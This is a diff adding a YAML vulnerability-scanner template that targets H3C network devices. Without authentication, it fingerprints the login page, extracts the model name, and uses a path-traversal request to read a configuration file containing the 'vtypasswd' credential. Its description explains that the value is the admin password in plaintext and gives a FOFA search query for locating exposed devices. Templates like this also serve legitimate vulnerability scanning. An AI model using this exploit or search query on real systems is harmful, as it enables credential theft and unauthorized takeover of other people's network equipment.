@@ -1,0 +1,27 @@
+id: h3c-information-leakage
+
+info:
+  name: H3C设备敏感信息泄露
+  author: ifofor
+  severity: high
+  description: |-
+    未授权读取密码文件，可获取明文密码（用户名admin，密码：第二个数据包vtypasswd的值）
+    fofa: "userLogin.asp" && server="H3C-Miniware-Webs"
+  tags: h3c,information-leakage
+  created: 2023/07/25
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /userLogin.asp
+    expression: response.status == 200 && response.body.bcontains(b'H3C Corporation')
+    output:
+      search: '"(?P<title2>(?<=<title>)[A-Z^](.+)[0-9A-Z])".bsubmatch(response.body)'
+      name: search["title2"]
+  r1:
+    request:
+      method: GET
+      path: /userLogin.asp/../actionpolicy_status/../{{name}}.cfg
+    expression: response.status == 200 && response.body.bcontains(b'vtypasswd=')
+expression: r0() && r1()
